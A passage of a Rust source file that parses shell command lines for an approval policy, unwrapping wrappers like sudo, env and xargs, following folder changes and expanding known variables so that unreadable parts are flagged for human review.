//! Reads a shell command line for the approval policy (see docs/ARCHITECTURE.md#approvals-policy).
//!
//! This is not a shell and runs nothing. [`parse`] returns the simple commands a line
//! runs, with the wrappers taken off (`sudo`, `env`, `timeout`, `xargs`, `sh -c`,
//! `find -exec` …), the redirections of each, the folder each one runs in (`cd` and
//! `pushd`/`popd` are followed), what its words expand to where that is known, and
//! `opaque`: the reasons why some part of the line could not be read. Where a word or a
//! folder cannot be known, the command says so; the policy asks the human about it.

use std::collections::HashMap;

/// Longer lines are not read at all: the result is opaque ("too long").
pub const MAX_LEN: usize = 64 * 1024;
/// Shells, substitutions and wrappers nested deeper than this are opaque ("nesting").
const MAX_DEPTH: usize = 8;

/// Words that shape a command without being the command. Skipped where a command starts.
const RESERVED: &[&str] = &[
    "!", "if", "then", "else", "elif", "fi", "do", "done", "while", "until", "case", "esac", "for", "select",
    "function",
];
const EXEC_FLAGS: &[&str] = &["-exec", "-execdir", "-ok", "-okdir"];
const SUDO_VALUE_FLAGS: &[&str] = &[
    "-u", "-g", "-h", "-p", "-r", "-t", "-C", "-D", "-U", "--user", "--group", "--host", "--prompt", "--role", "--type",
];
const DOAS_VALUE_FLAGS: &[&str] = &["-u", "-C"];
const ENV_VALUE_FLAGS: &[&str] = &["-u", "-C", "-S"];
const TIMEOUT_VALUE_FLAGS: &[&str] = &["-s", "-k", "--signal", "--kill-after"];
const IONICE_VALUE_FLAGS: &[&str] = &["-c", "-n", "-p", "-P", "-u"];
const XARGS_VALUE_FLAGS: &[&str] = &["-a", "-d", "-E", "-I", "-L", "-n", "-P", "-s"];

/// Resolves `~user` to that user's home folder. None when there is no such user.
pub type UserDir = fn(&str) -> Option<String>;

/// What the reader needs to know about the daemon's own surroundings.
#[derive(Clone)]
pub struct Env {
    /// The user's home folder: the start of `~`, `$HOME` before the line changes it.
    pub home: String,
    /// The data folder: `$BANDITO_HOME`.
    pub bandito_home: String,
    /// Looks up `~user`.
    pub users: UserDir,
}

/// What a command line runs and what could not be read.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct Parsed {
    /// Every simple command that runs, wrappers removed. Order is not meaningful.
    pub commands: Vec<SimpleCommand>,
    /// Why some part of the line could not be read. Each reason appears once.
    pub opaque: Vec<&'static str>,
}

/// One command with its arguments and redirections.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct SimpleCommand {
    /// Program name (basename, so `/usr/bin/rm` is `rm`) and arguments, quotes removed.
    /// Empty for a line that only redirects.
    pub argv: Vec<String>,
    /// The program as written, before the basename was taken (`/usr/bin/rm`). Empty when `argv` is.
    pub program: String,
    /// What each word of `argv` expands to, where it is known (`None`: a variable, `~user` or
    /// substitution that cannot be known here). Same length and order as `argv`; `[0]` is the
    /// program as written.
    pub expanded: Vec<Option<String>>,
    pub redirects: Vec<Redirect>,
    /// The folder the command runs in: absolute and lexically normalized. None when it is not known.
    pub cwd: Option<String>,
    /// Names set just before the command (`NAME=value cmd`), and by `env` in front of it.
    pub assigned: Vec<String>,
    /// The arguments come from input through `xargs`, not from the line.
    pub via_xargs: bool,
    /// `find … -delete`.
    pub find_delete: bool,
    /// `find … -exec`, `-execdir`, `-ok` or `-okdir`.
    pub find_exec: bool,
}

/// A redirection. `op` is the operator with its descriptor: `>`, `>>`, `<`, `>|`, `&>`,
/// `&>>`, `<>`, `2>`, `2>>`, …. Descriptor duplications (`2>&1`) keep `>&` / `<&` and
/// a descriptor number (or `-`) as the target; they name no file.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct Redirect {
    pub op: String,
    pub target: String,
    /// What the target expands to, where it is known.
    pub expanded: Option<String>,
}

impl Redirect {
    /// True for a descriptor duplication (`2>&1`, `<&0`): its target is a descriptor, not a file.
    pub fn is_duplication(&self) -> bool {
        self.op.ends_with(">&") || self.op.ends_with("<&")
    }

    /// True for a redirection that names a file the command may write (`<` only reads).
    pub fn writes_file(&self) -> bool {
        self.op != "<" && !self.is_duplication()
    }
}

impl Parsed {
    fn note(&mut self, why: &'static str) {
        if !self.opaque.contains(&why) {
            self.opaque.push(why);
        }
    }
}

/// Reads a command line that runs in `cwd` (None: not known), in the surroundings `env`.
/// Never fails: what cannot be read is listed in `opaque`, and unknown values are None.
pub fn parse(cmd: &str, cwd: Option<&str>, env: &Env) -> Parsed {
    let state = State::initial(env, cwd.map(canon));
    parse_state(cmd, 0, env, state)
}

/// Lexically normalized absolute form of a path: `.` and empty parts dropped, `..` applied.
pub fn canon(path: &str) -> String {
    format!("/{}", normalize_path(path).join("/"))
}

/// Path components, lexically: empty and `.` dropped, `..` pops (no-op at the root).
pub fn normalize_path(path: &str) -> Vec<&str> {
    let mut parts: Vec<&str> = Vec::new();
    for component in path.split('/') {
        match component {
            "" | "." => {}
            ".." => {
                parts.pop();
            }
            other => parts.push(other),
        }
    }
    parts
}

/// Shell state that changes along a line: variables, the folder, and `pushd` stack.
#[derive(Clone, Default)]
struct State {
    /// Known values by name. A name mapped to None, or not mapped at all, is unknown.
    vars: HashMap<String, Option<String>>,
    cwd: Option<String>,
    dirs: Vec<Option<String>>,
}

impl State {
    fn initial(env: &Env, cwd: Option<String>) -> State {
        let mut vars = HashMap::new();
        vars.insert("HOME".to_string(), Some(env.home.clone()));
        vars.insert("BANDITO_HOME".to_string(), Some(env.bandito_home.clone()));
        State {
            vars,
            cwd,
            dirs: Vec::new(),
        }
    }

    fn var(&self, name: &str) -> Option<String> {
        self.vars.get(name).cloned().flatten()
    }

    /// Sets a variable. In a pipeline the assignment runs in a subshell in many shells, so it is unknown after it.
    fn set(&mut self, name: &str, value: Option<String>, piped: bool) {
        self.vars.insert(name.to_string(), if piped { None } else { value });
    }
}

fn parse_state(cmd: &str, depth: usize, env: &Env, state: State) -> Parsed {
    if depth > MAX_DEPTH {
        let mut out = Parsed::default();
        out.note("nesting");
        return out;
    }
    if cmd.len() > MAX_LEN {
        let mut out = Parsed::default();
        out.note("too long");
        return out;
    }
    let mut lexer = Lexer::new(cmd, depth, env.clone());
    let tokens = lexer.run();
    let mut out = lexer.out;
    let mut st = state;
    // Each `(` saves the state, and the matching `)` brings it back: a subshell changes nothing outside.
    let mut saved: Vec<State> = Vec::new();
    for raw in build(&tokens) {
        for _ in 0..raw.closes {
            if let Some(prev) = saved.pop() {
                st = prev;
            }
        }
        for _ in 0..raw.opens {
            saved.push(st.clone());
        }
        for why in &raw.opaque {
            out.note(why);
        }
        run_raw(&raw, &mut st, depth, env, &mut out);
    }
    out
}

/// One word after expansion: its text, and what it expands to where that is known.
#[derive(Clone, Debug)]
struct Word {
    text: String,
    exp: Option<String>,
}

/// Runs one raw command: expands its words in the current state, then reads it and follows its effect on the shell.
fn run_raw(raw: &Raw, st: &mut State, depth: usize, env: &Env, out: &mut Parsed) {
    let words: Vec<Word> = raw
        .words
        .iter()
        .map(|(text, src)| Word {
            text: text.clone(),
            exp: expand(src, st, env),
        })
        .collect();
    let redirects: Vec<Redirect> = raw
        .redirects
        .iter()
        .map(|(r, src)| Redirect {
            expanded: expand(src, st, env),
            ..r.clone()
        })
        .collect();
    let piped = raw.piped_in || raw.piped_out;
    let ctx = Ctx {
        depth,
        via_xargs: false,
        piped: raw.piped_in,
        cwd: st.cwd.clone(),
        assigned: Vec::new(),
    };
    let assigns = words.iter().take_while(|w| is_assignment(&w.text)).count();
    if assigns == words.len() {
        // Only assignments (and maybe redirections): they change the shell's own variables.
        for word in &words {
            let (name, _) = split_assignment(&word.text);
            let value = word
                .exp
                .as_deref()
                .and_then(|e| e.split_once('='))
                .map(|(_, v)| v.to_string());
            st.set(name, value, piped);
        }
        if !redirects.is_empty() {
            out.commands.push(build_simple(&[], &redirects, &ctx, (false, false)));
        }
        return;
    }
    let assigned: Vec<String> = words[..assigns]
        .iter()
        .map(|w| split_assignment(&w.text).0.to_string())
        .collect();
    let command = &words[assigns..];
    let ctx = Ctx { assigned, ..ctx };
    normalize(command, &redirects, &ctx, env, st, out);
    effects(command, st, piped);
}

/// The shell's own changes made by a command: `cd`, `pushd`, `popd`, `export`, `unset`, `read`, …
fn effects(words: &[Word], st: &mut State, piped: bool) {
    let Some(first) = words.first() else {
        return;
    };
    let args = &words[1..];
    match basename(&first.text) {
        "cd" => {
            let target = cd_target(args, st);
            st.cwd = if piped { None } else { target };
        }
        "pushd" => {
            st.dirs.push(st.cwd.clone());
            let target = cd_target(args, st);
            st.cwd = if piped { None } else { target };
        }
        "popd" => {
            let top = st.dirs.pop().flatten();
            st.cwd = if piped { None } else { top };
        }
        "export" | "declare" | "typeset" | "local" | "readonly" => {
            for word in args.iter().filter(|w| !w.text.starts_with('-')) {
                if is_assignment(&word.text) {
                    let (name, _) = split_assignment(&word.text);
                    // The expansion of `NAME=value` is `NAME=` plus the expanded value.
                    let value = word
                        .exp
                        .as_deref()
                        .and_then(|e| e.split_once('='))
                        .map(|(_, v)| v.to_string());
                    st.set(name, value, piped);
                } else {
                    st.set(&word.text, None, piped);
                }
            }
        }
        "unset" | "read" => {
            for word in args.iter().filter(|w| !w.text.starts_with('-')) {
                st.set(&word.text, None, piped);
            }
        }
        _ => {}
    }
}

/// The folder `cd` goes to, if it is known. No argument goes home; `cd -` is unknown.
fn cd_target(args: &[Word], st: &State) -> Option<String> {
    let operands: Vec<&Word> = args
        .iter()
        .filter(|w| !(w.text.starts_with('-') && w.text != "-"))
        .collect();
    match operands.as_slice() {
        [] => st.var("HOME").map(|home| canon(&home)),
        [word] if word.text == "-" => None,
        [word] => resolve(word.exp.as_deref()?, st.cwd.as_deref()),
        _ => None,
    }
}

/// A path as the shell would make it absolute from `cwd`; None when `cwd` is unknown and the path is relative.
fn resolve(path: &str, cwd: Option<&str>) -> Option<String> {
    if path.starts_with('/') {
        Some(canon(path))
    } else {
        cwd.map(|c| canon(&format!("{c}/{path}")))
    }
}

/// Expands the parts of a word that this reader can know: `~`, `~user`, `$NAME`, `${NAME}`.
/// None when a part cannot be known (a variable not set on this line, a substitution, a
/// positional or special parameter, a parameter expression, an unknown user).
/// Stands for a `$` or `~` that quotes or an escape made literal, in the source form of a word.
const LIT_DOLLAR: char = '\u{E001}';
const LIT_TILDE: char = '\u{E002}';

/// The word as expansion reads it, from its source characters: a `$` or `~` that single quotes,
/// a backslash or `\"` made literal is kept as a marker, so it is not expanded. A word with a
/// substitution or an ANSI-C quote is unknown here, and reads as `$(`.
fn source_of(raw: &[char]) -> String {
    let mut out = String::new();
    let lit = |out: &mut String, c: char| {
        out.push(match c {
            '$' => LIT_DOLLAR,
            '~' => LIT_TILDE,
            other => other,
        })
    };
    let mut i = 0;
    while i < raw.len() {
        match raw[i] {
            '\\' => {
                match raw.get(i + 1) {
                    Some(&'\n') => {}
                    Some(&next) => lit(&mut out, next),
                    None => lit(&mut out, '\\'),
                }
                i += 2;
            }
            '\'' => {
                i += 1;
                while i < raw.len() && raw[i] != '\'' {
                    lit(&mut out, raw[i]);
                    i += 1;
                }
                i += 1;
            }
            '"' => {
                i += 1;
                while i < raw.len() && raw[i] != '"' {
                    match raw[i] {
                        '\\' if raw.get(i + 1).is_some_and(|c| matches!(*c, '"' | '\\' | '$' | '`')) => {
                            lit(&mut out, raw[i + 1]);
                            i += 2;
                        }
                        '$' if raw.get(i + 1) == Some(&'(') => return "$(".to_string(),
                        '`' => return "$(".to_string(),
                        '~' => {
                            lit(&mut out, '~');
                            i += 1;
                        }
                        c => {
                            out.push(c);
                            i += 1;
                        }
                    }
                }
                i += 1;
            }
            '`' => return "$(".to_string(),
            '$' if raw.get(i + 1) == Some(&'(') => return "$(".to_string(),
            '$' if raw.get(i + 1) == Some(&'\'') => match decode_ansi_c(raw, i + 2) {
                Some((decoded, end)) => {
                    decoded.chars().for_each(|c| lit(&mut out, c));
                    i = end;
                }
                None => return "$(".to_string(),
            },
            // `$"…"` is `"…"`: the `$` is dropped and the quote is read next.
            '$' if raw.get(i + 1) == Some(&'"') => i += 1,
            c => {
                out.push(c);
                i += 1;
            }
        }
    }
    out
}

/// Decodes the body of an ANSI-C quote (`$'…'`) that starts at `start`, just after the opening
/// quote, the way bash reads its escapes. Returns the decoded text and the index after the closing
/// quote; None when the quote never closes.
fn decode_ansi_c(chars: &[char], start: usize) -> Option<(String, usize)> {
    let mut text = String::new();
    let mut i = start;
    while let Some(&c) = chars.get(i) {
        i += 1;
        match c {
            '\'' => return Some((text, i)),
            '\\' => {
                let Some(&e) = chars.get(i) else {
                    break;
                };
                i += 1;
                match e {
                    'n' => text.push('\n'),
                    't' => text.push('\t'),
                    'r' => text.push('\r'),
                    'a' => text.push('\u{7}'),
                    'b' => text.push('\u{8}'),
                    'e' | 'E' => text.push('\u{1b}'),
                    'f' => text.push('\u{c}'),
                    'v' => text.push('\u{b}'),
                    '\\' | '\'' | '"' | '?' => text.push(e),
                    'x' => i = numeric_escape(chars, i, 16, 2, &mut text, "\\x"),
                    'u' => i = numeric_escape(chars, i, 16, 4, &mut text, "\\u"),
                    'U' => i = numeric_escape(chars, i, 16, 8, &mut text, "\\U"),
                    '0'..='7' => {
                        let mut value = e.to_digit(8).unwrap_or(0);
                        for _ in 0..2 {
                            match chars.get(i).and_then(|d| d.to_digit(8)) {
                                Some(d) => {
                                    value = value * 8 + d;
                                    i += 1;
                                }
                                None => break,
                            }
                        }
                        text.push(char::from_u32(value).unwrap_or('\u{fffd}'));
                    }
                    other => {
                        text.push('\\');
                        text.push(other);
                    }
                }
            }
            other => text.push(other),
        }
    }
    None
}

/// Up to `max` digits in `radix` at `i`, after an ANSI-C `\x`, `\u` or `\U`. No digits: the escape
/// stays as written. Returns the index after the digits.
fn numeric_escape(chars: &[char], mut i: usize, radix: u32, max: usize, text: &mut String, written: &str) -> usize {
    let mut value = 0u32;
    let mut count = 0;
    while count < max {
        match chars.get(i).and_then(|d| d.to_digit(radix)) {
            Some(d) => {
                value = value.wrapping_mul(radix).wrapping_add(d);
                i += 1;
                count += 1;
            }
            None => break,
        }
    }
    if count == 0 {
        text.push_str(written);
    } else {
        text.push(char::from_u32(value).unwrap_or('\u{fffd}'));
    }
    i
}

/// Replaces the markers of [`source_of`] with the characters they stand for.
fn unmark(segment: &str) -> String {
    segment
        .chars()
        .map(|c| match c {
            LIT_DOLLAR => '$',
            LIT_TILDE => '~',
            other => other,
        })
        .collect()
}

fn expand(word: &str, st: &State, env: &Env) -> Option<String> {
    if word.contains('`') || word.contains("$(") || word.contains("<(") || word.contains(">(") {
        return None;
    }
    // `--output=~/x` and `--dir=$HOME/x`: the value after an option's `=` expands as a word of its own.
    if let Some((head, tail)) = word
        .split_once('=')
        .filter(|(head, tail)| head.starts_with('-') && (tail.starts_with('~') || tail.contains('$')))
    {
        return Some(format!("{head}={}", expand(tail, st, env)?));
    }
    let mut out = String::new();
    let mut rest = word;
    if let Some(after) = word.strip_prefix('~') {
        let end = after.find('/').unwrap_or(after.len());
        let name = &after[..end];
        let dir = match name {
            "" => st.var("HOME"),
            "+" | "-" => None,
            _ => (env.users)(name),
        }?;
        out.push_str(&dir);
        rest = &after[end..];
    }
    while let Some(pos) = rest.find('$') {
        out.push_str(&unmark(&rest[..pos]));
        let after = &rest[pos + 1..];
        if let Some(inner) = after.strip_prefix('{') {
            let end = inner.find('}')?;
            let name = &inner[..end];
            if !is_name(name) {
                return None;
            }
            out.push_str(&st.var(name)?);
            rest = &inner[end + 1..];
        } else {
            let len = after
                .chars()
                .take_while(|c| c.is_ascii_alphanumeric() || *c == '_')
                .count();
            if len == 0 {
                match after.chars().next() {
                    Some(c) if "@*#?-$!".contains(c) => return None,
                    _ => {
                        out.push('$');
                        rest = after;
                        continue;
                    }
                }
            }
            let name = &after[..len];
            out.push_str(&st.var(name)?);
            rest = &after[len..];
        }
    }
    out.push_str(&unmark(rest));
    Some(out)
}

/// `NAME` as a shell variable name: a letter or `_`, then letters, digits or `_`.
fn is_name(name: &str) -> bool {
    let mut chars = name.chars();
    matches!(chars.next(), Some(c) if c.is_ascii_alphabetic() || c == '_')
        && chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum Tok {
    /// `quoted` when any part was quoted or escaped: such a word is never a keyword. `shell`
    /// names the shell feature the word needs and this reader does not model (brace expansion, zsh `=word`).
    Word {
        text: String,
        /// The word as expansion reads it (see [`source_of`]).
        src: String,
        quoted: bool,
        shell: Option<&'static str>,
    },
    /// `&&`, `||`, `;`, `&`, `|`, `|&`, `(`, `)`, a newline. A bare `{` or `}` is also `;`.
    Op(&'static str),
    /// A redirection. Its target is the next word. `fd` holds the digits before it, or "".
    Redir { fd: String, op: &'static str },
    /// A heredoc or here-string. Its body is skipped; it has no target word.
    Heredoc,
}

struct Lexer {
    chars: Vec<char>,
    pos: usize,
    depth: usize,
    env: Env,
    stop: bool,
    /// Heredoc delimiters whose bodies start on the next line: (word, `<<-` strips tabs).
    heredocs: Vec<(String, bool)>,
    /// Commands from substitutions, already read, and the reasons found so far.
    out: Parsed,
}

impl Lexer {
    fn new(cmd: &str, depth: usize, env: Env) -> Self {
        Self {
            chars: cmd.chars().collect(),
            pos: 0,
            depth,
            env,
            stop: false,
            heredocs: Vec::new(),
            out: Parsed::default(),
        }
    }

    fn peek(&self, ahead: usize) -> Option<char> {
        self.chars.get(self.pos + ahead).copied()
    }

    fn bump(&mut self) -> Option<char> {
        let c = self.peek(0)?;
        self.pos += 1;
        Some(c)
    }

    fn note(&mut self, why: &'static str) {
        self.out.note(why);
    }

    fn run(&mut self) -> Vec<Tok> {
        let mut toks = Vec::new();
        while !self.stop {
            self.skip_blanks();
            let Some(c) = self.peek(0) else { break };
            let next = self.peek(1);
            match c {
                '\n' => {
                    self.pos += 1;
                    toks.push(Tok::Op("\n"));
                    self.skip_heredoc_bodies();
                }
                '#' => self.skip_comment(),
                ';' => {
                    self.pos += if next == Some(';') { 2 } else { 1 };
                    toks.push(Tok::Op(";"));
                }
                '&' if next == Some('&') => {
                    self.pos += 2;
                    toks.push(Tok::Op("&&"));
                }
                '&' if next == Some('>') => {
                    let op = if self.peek(2) == Some('>') {
                        self.pos += 3;
                        "&>>"
                    } else {
                        self.pos += 2;
                        "&>"
                    };
                    toks.push(Tok::Redir { fd: String::new(), op });
                }
                '&' => {
                    self.pos += 1;
                    toks.push(Tok::Op("&"));
                }
                '|' if next == Some('|') => {
                    self.pos += 2;
                    toks.push(Tok::Op("||"));
                }
                '|' if next == Some('&') => {
                    self.pos += 2;
                    toks.push(Tok::Op("|&"));
                }
                '|' => {
                    self.pos += 1;
                    toks.push(Tok::Op("|"));
                }
                '(' => {
                    self.pos += 1;
                    toks.push(Tok::Op("("));
                }
                ')' => {
                    self.pos += 1;
                    toks.push(Tok::Op(")"));
                }
                '<' | '>' => self.redirect(String::new(), &mut toks),
                _ if c.is_ascii_digit() && self.fd_digits() > 0 => {
                    let n = self.fd_digits();
                    let fd: String = self.chars[self.pos..self.pos + n].iter().collect();
                    self.pos += n;
                    self.redirect(fd, &mut toks);
                }
                _ => {
                    let start = self.pos;
                    let (text, quoted, shell) = self.word();
                    let src = source_of(&self.chars[start..self.pos]);
                    if self.pos == start {
                        self.pos += 1;
                        continue;
                    }
                    if !quoted && (text == "{" || text == "}") {
                        toks.push(Tok::Op(";"));
                    } else if quoted || !text.is_empty() {
                        toks.push(Tok::Word {
                            text,
                            src,
                            quoted,
                            shell,
                        });
                    }
                }
            }
        }
        toks
    }

    /// Number of digits at the position when a redirection follows them directly; else 0.
    fn fd_digits(&self) -> usize {
        let digits = self.chars[self.pos..].iter().take_while(|c| c.is_ascii_digit()).count();
        match self.chars.get(self.pos + digits) {
            Some('<' | '>') => digits,
            _ => 0,
        }
    }

    fn skip_blanks(&mut self) {
        while matches!(self.peek(0), Some(' ' | '\t' | '\r')) {
            self.pos += 1;
        }
    }

    fn skip_comment(&mut self) {
        while !matches!(self.peek(0), None | Some('\n')) {
            self.pos += 1;
        }
    }

    /// At `<` or `>` (after an optional descriptor): reads the operator and pushes it.
    fn redirect(&mut self, fd: String, toks: &mut Vec<Tok>) {
        let c = self.chars[self.pos];
        let next = self.peek(1);
        if fd.is_empty() && next == Some('(') {
            // `<(…)` and `>(…)`: a process substitution. Its output is a path, so it stands as a word.
            self.pos += 2;
            if let Some(inner) = self.extract_paren() {
                self.note("process substitution");
                self.nested(&inner);
                let text = format!("{c}({inner})");
                toks.push(Tok::Word {
                    src: text.clone(),
                    text,
                    quoted: true,
                    shell: None,
                });
            }
            return;
        }
        let op: &'static str = match (c, next) {
            ('<', Some('<')) => {
                if self.peek(2) == Some('<') {
                    // here-string: its word is data, not a command
                    self.pos += 3;
                    self.skip_blanks();
                    let _ = self.word();
                } else {
                    self.pos += 2;
                    let strip = self.peek(0) == Some('-');
                    if strip {
                        self.pos += 1;
                    }
                    self.skip_blanks();
                    let (delim, _, _) = self.word();
                    self.heredocs.push((delim, strip));
                }
                self.note("heredoc");
                toks.push(Tok::Heredoc);
                return;
            }
            ('<', Some('>')) => {
                self.pos += 2;
                "<>"
            }
            ('<', Some('&')) => {
                self.pos += 2;
                "<&"
            }
            ('<', _) => {
                self.pos += 1;
                "<"
            }
            (_, Some('>')) => {
                self.pos += 2;
                ">>"
            }
            (_, Some('|')) => {
                self.pos += 2;
                ">|"
            }
            (_, Some('&')) => {
                self.pos += 2;
                ">&"
            }
            _ => {
                self.pos += 1;
                ">"
            }
        };
        toks.push(Tok::Redir { fd, op });
    }

    /// Reads one word: quotes removed, `$(…)` and backticks read as commands. Stops at
    /// blanks and operators. Returns the text, whether any part was quoted, and the
    /// shell feature it needs that is not modelled (if any).
    fn word(&mut self) -> (String, bool, Option<&'static str>) {
        let mut text = String::new();
        let mut quoted = false;
        // Unquoted brace expansion: `{`, then `,` or `..`, then `}`.
        let mut brace_open = false;
        let mut brace_sep = false;
        let mut brace = false;
        let mut zsh_equals = false;
        while let Some(c) = self.peek(0) {
            match c {
                ' ' | '\t' | '\r' | '\n' | ';' | '&' | '|' | '(' | ')' | '<' | '>' => break,
                '\\' => match self.peek(1) {
                    Some('\n') => self.pos += 2,
                    Some(next) => {
                        text.push(next);
                        quoted = true;
                        self.pos += 2;
                    }
                    None => {
                        text.push('\\');
                        quoted = true;
                        self.pos += 1;
                    }
                },
                '\'' => {
                    quoted = true;
                    self.pos += 1;
                    loop {
                        match self.bump() {
                            Some('\'') => break,
                            Some(ch) => text.push(ch),
                            None => {
                                self.note("unclosed quote");
                                self.stop = true;
                                return (text, quoted, None);
                            }
                        }
                    }
                }
                '"' => {
                    quoted = true;
                    self.pos += 1;
                    if !self.double_quoted(&mut text) {
                        return (text, quoted, None);
                    }
                }
                '$' if self.peek(1) == Some('\'') => {
                    quoted = true;
                    self.pos += 2;
                    if !self.ansi_c(&mut text) {
                        return (text, quoted, None);
                    }
                }
                // `$"…"` is `"…"` (the translation is not modelled).
                '$' if self.peek(1) == Some('"') => self.pos += 1,
                '$' if self.peek(1) == Some('(') => {
                    quoted = true;
                    self.pos += 2;
                    self.substitution(&mut text);
                }
                '`' => {
                    quoted = true;
                    self.pos += 1;
                    self.backticks(&mut text);
                }
                _ => {
                    if c == '=' && text.is_empty() && !quoted {
                        zsh_equals = true;
                    }
                    match c {
                        '{' => {
                            brace_open = true;
                            brace_sep = false;
                        }
                        ',' if brace_open => brace_sep = true,
                        '.' if brace_open && self.peek(1) == Some('.') => brace_sep = true,
                        '}' => {
                            brace |= brace_open && brace_sep;
                            brace_open = false;
                            brace_sep = false;
                        }
                        _ => {}
                    }
                    text.push(c);
                    self.pos += 1;
                }
            }
        }
        let shell = if brace {
            Some("brace expansion")
        } else if zsh_equals {
            Some("zsh =word")
        } else {
            None
        };
        (text, quoted, shell)
    }

    /// Reads a double-quoted part (after the opening quote). False when it is not closed.
    fn double_quoted(&mut self, text: &mut String) -> bool {
        loop {
            match self.peek(0) {
                None => {
                    self.note("unclosed quote");
                    self.stop = true;
                    return false;
                }
                Some('"') => {
                    self.pos += 1;
                    return true;
                }
                Some('\\') => match self.peek(1) {
                    Some(c @ ('"' | '\\' | '$' | '`')) => {
                        text.push(c);
                        self.pos += 2;
                    }
                    Some('\n') => self.pos += 2,
                    _ => {
                        text.push('\\');
                        self.pos += 1;
                    }
                },
                Some('$') if self.peek(1) == Some('(') => {
                    self.pos += 2;
                    self.substitution(text);
                }
                Some('`') => {
                    self.pos += 1;
                    self.backticks(text);
                }
                Some(c) => {
                    text.push(c);
                    self.pos += 1;
                }
            }
        }
    }

    /// After `$'`: the ANSI-C quoted text, decoded. False when it is not closed.
    fn ansi_c(&mut self, text: &mut String) -> bool {
        match decode_ansi_c(&self.chars, self.pos) {
            Some((decoded, end)) => {
                text.push_str(&decoded);
                self.pos = end;
                true
            }
            None => {
                self.note("unclosed quote");
                self.stop = true;
                self.pos = self.chars.len();
                false
            }
        }
    }

    /// After `$(`: reads the command up to its closing parenthesis and reads it.
    fn substitution(&mut self, text: &mut String) {
        if let Some(inner) = self.extract_paren() {
            self.note("command substitution");
            self.nested(&inner);
            text.push_str("$(");
            text.push_str(&inner);
            text.push(')');
        }
    }

    /// After an opening parenthesis: the text up to the matching `)`. Quotes and escapes
    /// inside are skipped over. None (and the rest of the line is opaque) when it never closes.
    fn extract_paren(&mut self) -> Option<String> {
        let start = self.pos;
        let len = self.chars.len();
        let mut depth = 1usize;
        let mut i = start;
        while i < len {
            match self.chars[i] {
                '\\' => i += 1,
                '\'' => {
                    i += 1;
                    while i < len && self.chars[i] != '\'' {
                        i += 1;
                    }
                }
                '"' => {
                    i += 1;
                    while i < len && self.chars[i] != '"' {
                        if self.chars[i] == '\\' {
                            i += 1;
                        }
                        i += 1;
                    }
                }
                '(' => depth += 1,
                ')' => {
                    depth -= 1;
                    if depth == 0 {
                        self.pos = i + 1;
                        return Some(self.chars[start..i].iter().collect());
                    }
                }
                _ => {}
            }
            i += 1;
        }
        self.pos = len;
        self.stop = true;
        self.note("unclosed substitution");
        None
    }

    /// After an opening backtick: reads up to the closing one and reads it.
    fn backticks(&mut self, text: &mut String) {
        let start = self.pos;
        let len = self.chars.len();
        let mut i = start;
        while i < len {
            match self.chars[i] {
                '\\' => i += 2,
                '`' => {
                    let inner: String = self.chars[start..i].iter().collect();
                    self.pos = i + 1;
                    self.note("backticks");
                    self.nested(&inner);
                    text.push('`');
                    text.push_str(&inner);
                    text.push('`');
                    return;
                }
                _ => i += 1,
            }
        }
        self.pos = len;
        self.stop = true;
        self.note("unclosed backticks");
    }

    /// Reads text that a substitution runs. Its shell state is not known here, so it starts unknown.
    fn nested(&mut self, inner: &str) {
        let state = State::initial(&self.env, None);
        let parsed = parse_state(inner, self.depth + 1, &self.env, state);
        merge(&mut self.out, parsed, &[]);
    }

    /// Skips the bodies of the heredocs opened on the line that just ended.
    fn skip_heredoc_bodies(&mut self) {
        for (delim, strip) in std::mem::take(&mut self.heredocs) {
            loop {
                if self.pos >= self.chars.len() {
                    break;
                }
                let start = self.pos;
                while self.pos < self.chars.len() && self.chars[self.pos] != '\n' {
                    self.pos += 1;
                }
                let line: String = self.chars[start..self.pos].iter().collect();
                if self.pos < self.chars.len() {
                    self.pos += 1;
                }
                let line = line.trim_end_matches('\r');
                let line = if strip { line.trim_start_matches('\t') } else { line };
                if line == delim {
                    break;
                }
            }
        }
    }
}

/// A simple command as the lexer found it: words and redirections, before wrappers and expansion.
#[derive(Debug, Default)]
struct Raw {
    /// (text, source form) of each word.
    words: Vec<(String, String)>,
    /// Each redirection with the source form of its target.
    redirects: Vec<(Redirect, String)>,
    /// Shell features this command needs that are not modelled.
    opaque: Vec<&'static str>,
    /// Fed by a pipe (`… | this`).
    piped_in: bool,
    /// Its output goes to a pipe (`this | …`).
    piped_out: bool,
    /// Subshells opened just before it, and closed just before it.
    opens: usize,
    closes: usize,
}

impl Raw {
    fn is_empty(&self) -> bool {
        self.words.is_empty() && self.redirects.is_empty()
    }
}

/// Groups tokens into simple commands, split at operators; keeps subshell nesting and pipes.
fn build(tokens: &[Tok]) -> Vec<Raw> {
    let mut raws = Vec::new();
    let mut cur = Raw::default();
    let mut started = false;
    let mut piped_in = false;
    let mut pend_open = 0usize;
    let mut pend_close = 0usize;
    let mut i = 0;
    while i < tokens.len() {
        match &tokens[i] {
            Tok::Op(op) => match *op {
                "|" | "|&" => {
                    cur.piped_out = true;
                    finish(&mut raws, &mut cur, &mut started);
                    piped_in = true;
                }
                "(" => {
                    finish(&mut raws, &mut cur, &mut started);
                    pend_open += 1;
                }
                ")" => {
                    finish(&mut raws, &mut cur, &mut started);
                    pend_close += 1;
                }
                _ => {
                    finish(&mut raws, &mut cur, &mut started);
                    piped_in = false;
                }
            },
            Tok::Heredoc => {}
            Tok::Redir { fd, op } => {
                if let Some(Tok::Word { text, src, shell, .. }) = tokens.get(i + 1) {
                    i += 1;
                    begin(&mut cur, &mut started, piped_in, &mut pend_open, &mut pend_close);
                    if let Some(reason) = shell {
                        cur.opaque.push(reason);
                    }
                    cur.redirects.push((redirect(fd, op, text.clone()), src.clone()));
                }
            }
            Tok::Word {
                text,
                src,
                quoted,
                shell,
            } => {
                if !(cur.words.is_empty() && !quoted && RESERVED.contains(&text.as_str())) {
                    begin(&mut cur, &mut started, piped_in, &mut pend_open, &mut pend_close);
                    if let Some(reason) = shell {
                        cur.opaque.push(reason);
                    }
                    cur.words.push((text.clone(), src.clone()));
                }
            }
        }
        i += 1;
    }
    finish(&mut raws, &mut cur, &mut started);
    raws
}

/// Marks the start of a command: it takes the pipe and subshell marks waiting for it.
fn begin(cur: &mut Raw, started: &mut bool, piped_in: bool, pend_open: &mut usize, pend_close: &mut usize) {
    if !*started {
        *started = true;
        cur.piped_in = piped_in;
        cur.opens = std::mem::take(pend_open);
        cur.closes = std::mem::take(pend_close);
    }
}

